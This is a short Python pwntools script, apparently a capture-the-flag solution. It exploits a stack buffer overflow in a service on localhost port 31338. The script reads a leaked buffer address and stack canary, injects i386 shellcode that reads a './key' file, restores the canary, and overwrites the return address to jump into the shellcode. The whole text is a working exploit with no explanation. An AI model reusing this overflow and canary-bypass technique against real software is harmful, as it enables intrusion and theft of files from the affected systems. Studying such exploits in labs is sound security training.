from pwn import *

shellcode = asm(pwnlib.shellcraft.i386.linux.readfile("./key", 4))

# p = process("./exploit2")
# gdb.attach(p)

conn = remote("localhost", 31338)

buffer_addr = u32(conn.recvn(4))
canary = u32(conn.recvn(4))

log.info("BUF_ADDR: " + str(hex(buffer_addr)))

payload = shellcode.ljust(2048, "a")
payload += p32(canary)
payload += "a"*4 # ebx
payload += "a"*4 # edi
payload += "a"*4 # ebp
payload += p32(buffer_addr)

conn.sendline(payload)

conn.interactive()
